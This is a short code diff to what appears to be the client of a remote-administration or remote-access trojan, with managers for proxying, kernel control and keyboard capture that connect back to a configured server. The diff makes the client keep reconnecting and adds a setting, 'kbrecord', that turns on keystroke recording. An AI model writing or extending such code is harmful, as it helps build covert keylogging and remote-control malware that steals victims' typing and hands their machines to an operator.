@@ -14,6 +14,7 @@
 #include "ProxyManager.h"
 
 #include "KernelManager.h" 
+#include <iniFile.h>
 
 #define REG_SETTINGS "Software\\ServerD11\\Settings"
 
@@ -105,10 +106,13 @@ template <class Manager, int n> DWORD WINAPI LoopManager(LPVOID lParam)
 	ThreadInfo *pInfo = (ThreadInfo *)lParam;
 	IOCPClient	*ClientObject = (IOCPClient *)pInfo->p;
 	CONNECT_ADDRESS& g_SETTINGS(*(pInfo->conn));
-	if (ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort()))
+	ClientObject->SetServerAddress(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort());
+	if (pInfo->run == FOREVER_RUN || ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort()))
 	{
 		Manager	m(ClientObject, n, pInfo->user);
+		pInfo->user = &m;
 		ClientObject->RunEventLoop(pInfo->run);
+		pInfo->user = NULL;
 	}
 	delete ClientObject;
 	pInfo->p = NULL;
@@ -168,6 +172,11 @@ DWORD WINAPI LoopServicesManager(LPVOID lParam)
 
 DWORD WINAPI LoopKeyboardManager(LPVOID lParam)
 {
+	iniFile cfg(CLIENT_PATH);
+	std::string s = cfg.GetStr("settings", "kbrecord", "No");
+	if (s == "Yes") {
+		return LoopManager<CKeyboardManager1, 1>(lParam);
+	}
 	return LoopManager<CKeyboardManager1, 0>(lParam);
 }
 
